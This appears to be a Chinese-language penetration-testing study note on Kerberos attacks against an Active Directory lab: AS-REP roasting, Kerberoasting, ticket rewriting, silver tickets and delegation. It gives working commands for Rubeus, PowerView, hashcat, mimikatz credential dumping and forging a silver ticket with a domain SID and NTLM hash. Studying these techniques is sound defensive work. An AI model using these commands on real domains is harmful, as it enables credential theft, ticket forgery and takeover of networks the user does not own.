### Rosting AS-REP
使用这个攻击方法需要域控开启“Do not require Kerberos preauthenticaton”，但是这个默认是关闭的。
在AS-REQ阶段，也就是kerberos的第一阶段会要求hash加密的时间戳，如果KDC使用hash解密的时间戳不匹配或者无法解密
kerberos验证就会失败。
但是如果启用“Do not require Kerberos
preauthenticaton”，就不需要进行验证，使用任意存在的用户名向KDC发送请求，KDC就会返回对应的hash加密的数据给我们，随后就可以进行爆破。
开启不需要预验证
使用powerview.ps1查询开启不需要预验证的账号
    powershell.exe -exec bypass -Command "& {Import-Module .\PowerView.ps1;Get-DomainUser -PreauthNotRequired}"
利用ASREPRoast.ps1获取hash
    powershell.exe -exec bypass -Command "& {Import-Module .\ASREPRoast.ps1;Get-ASREPHash -UserName sc -Domain alanlitl.com}"
利用Rubeus
    Rubeus.exe asreproast
只保存hash，使用hashcat进行爆破，在后添加$23
    hashcat.exe -m 18200 sc_hash.txt password.txt
## 横向（TGS-REP）
### kerberoasting攻击
#### SPN
##### SPN作用
服务主体名称（SPN）是服务实列（如HTTP，MySQL）的唯一标识
  1. Kerberos身份验证就是使用SPN将服务实列与服务登录账户相关联。
  2. SPN始终包含运行服务的主机名称，因此服务实列可以为其主机的每个名称或者别名注册SPN。
  3. 在整个林或者域䣌计算机上安装多个服务，每个服务都必须有自己的SPN，如果客户端使用多个名称进行身份验证，那么服务也可以有多个SPN。
##### SPN分类
  1. 注册在本地机器（Computers）下，当服务权限为Local System或者Network Service时，SPN在Computers下。
  2. 注册在域用户（User）下，当一个服务权限为与用户时，则注册在User下。
**注册问题** ：在windows域里面，默认普通本地机器账户可以注册SPN，但是普通域账户不能注册SPN，当一个服务以Local System
account启动时，kerberos就能成功，但是以域用户启动时就不能成功
**解决** ：在域控中将启动账户赋予`read servicePrincipalName 和 Write
serverPrincipalName`权限，或者手动注册SPN（`setspn -S MySQL/web-sc.de1ay.com:3307/MySQL
web`）。
    set -S http/. 
##### 查看SPN
    当前域
    setspn -q */*
    指定域
    setspn -T de1ay.com -q */*
    删除SPN
    setspn -D MySQL/web-sc.de1ay.com:3307/MySQL
    创建用户SPN，不是computer那种
    setspn -U xxx
扫描SPN
工具：
    查询用户注册的SPN
    Import-Module .\GetUserSPNs.ps1
    cscript .\GetUserSPNs.vbs
工具：
根据不同用户的objectsid返回，结果更加详细。
    Import-Module .\PowerView.ps1
    Get-NetUser -SPN
#### 利用SPN进行kerberoasting
原理：TGS-REP的数据包中，enc-part使用的是服务的hash加密，由于域内任何用户都可以向域内任何服务请求TGS，知道相关SPN后，可以使用SPN申请TGS
ticket，如果票据使用RC4加密，则可以通过爆破方式获取对应服务用户的密码。
**利用过程**
找到高权限账户SPN
由于本地没有啥SPN，先注册一个SPN
登录一个有注册SPN权限的账户
    setspn -U -A MySQL/web-sc.de1ay.com web
-U指定用户账户，-C指定计算机账户，增加、删除SPN的时候最好指定
    setspn -q */*
删除SPN `setspn -U -D MySQL/web-sc.de1ay.com web`
如果无法修改SPN可以在域控`adsiedit.msc`中对应用户的SELE属性中开启读取、写入servicePrincipalName权限。
使用GetUserSPN
使用powerview
申请票据
    powershell
    Add-Type -AssemblyName System.IdentityModel
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MySQL/web-sc.de1ay.com"
    cmd
    powershell.exe -exec bypass -Command "& {$SPNName = 'MySQL/web-sc.de1ay.com'; Add-Type -AssemblyNAme System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName }"
    一样的两句
    mimikatz
    kerberos::ask /target:SPNxxx
**使用mimikatz申请票据**
    kerberos::ask /target:MySQL/web-sc.de1ay.com:3307/MySQL
**使用Rubeus**.exe，可以直接获取hash，然后使用hashcat爆破
**申请RC4加密票据**
使用`System.IdentityModel.Tokens.KerberosRequestorSecurityToken`申请的票据可能会使用RC4加密，但实际这受到`msDS-SupportedEncryptionTypes`域对象属性影响，`msDS-SupportedEncryptionTypes`（
[微软文档](https://docs.microsoft.com/zh-cn/openspecs/windows_protocols/ms-adts/4f1f447a-4f35-49b1-a129-d76ea280a4c1)）字段的值决定了 Kerberoast
流程中返回的服务票证的加密级别。同时加密方式也收到本地组策略控制，如果在本地组策略中勾选RC4加密，那么不管域控中用户的`msDS-SupportedEncryptionTypes`字段如何设置都将为RC4加密。
**服务** 的`msDS-SupportedEncryptionTypes`字段为 **0x12** ，本地组策略为 **RC4**
加密方式依然为RC4
本地组策略修改为 **未设置** 后，申请的票据加密方式为aes256
cmd下klist 可以看见票据已经得到了
  1. **导出票据**
    mimikatz::list /export
  1. **获取hash**
  2.     1. **使用** kirbi2john.py获取票据中的hash
  3.     1.       1. 
  1. **破解hash**
  2.     1. **利用** tgsrepcrack.py，这个脚本可以直接破解票据kirbi而不需要转换为hash
  3.     1.       1. 
  4.     1. 使用hashcat：`hashcat.exe -m 13100 hash.txt password.txt --show`
  5.     1.       1. 
#### 服务票据重写（使用脚本出现一点问题，没有复现成功）
    改变用户
    python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -u 500
    改变组
    python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -g 512
    使用mimikatz注入票据
    kerberos::ptt PENTESTLAB.kirbi
### 白银票据
不同于黄金票据，通过使用服务hash伪造服务票据，只能访问对应服务。
我在windows server 2012 R2复现失败，换成2008成功了
#### 利用条件
域名
域SID
目标服务FQDN
可利用的服务
服务账号的NTLM Hash
伪造用户名
#### 利用过程
  1. 先获取hash
获取的是服务的hash，伪造cifs或者ldap之类的一般是主机的hash
    mimikatz log "privilege::debug" "sekurlsa::logonpasswords"
  1. 伪造票据
伪造cifs和ldap需要主机的hash
通过mimikatz伪造
    kerberos::golden /domain:alanlitl.com /sid:S-1-5-21-3389487055-3676497411-292983562 /target:dc.alanlitl.com /rc4:16ec75ab12108ae708f6d6a481f4ca4a /service:ldap /user:test /ptt
  1. 获取权限
## 委派
> 
>
> 
>
> 
>
> 
>
> 
>
> 
委派指用户将权限委派给服务账号，让服务账号能以用户权限开展活动
服务账号是指如MS SQL Server等运行时的账户，这类账户不能用于登录。
委派主要分为三类：非约束委派(Unconstrained delegation)、约束委派Constrained
delegation)、基于资源的约束委派(Resource Based Constrained Delegation)
如果账户设置敏感账户，不能被委派就无法使用委派，administrator默认就是敏感账户。
### 非约束委派
如果服务开启非约束委派，当用户访问服务时，服务会在lsass进程中保存TGT，然后服务就能利用TGT以用户的身份去访问其它服务。
开启方式：在用户属性中的委派页面开启，配置了非约束委派的账户的userAccountControl
属性有个FLAG位为TRUSTED_FOR_DELEGATION。设置非约束委派需要SeEnableDelegationPrivilege特权，该特权通常仅授权给域管。
**实现方式**
：用户向KDC发起请求获得TGT，然后用户再次向KDC发起请求获取TGT2，访问服务时将TGT，TGT2，ST一起发送给服务，服务在内存中储存TGT2，并且使用这张TGT2向KDC发起请求。获取到ST后向另一个服务发起请求。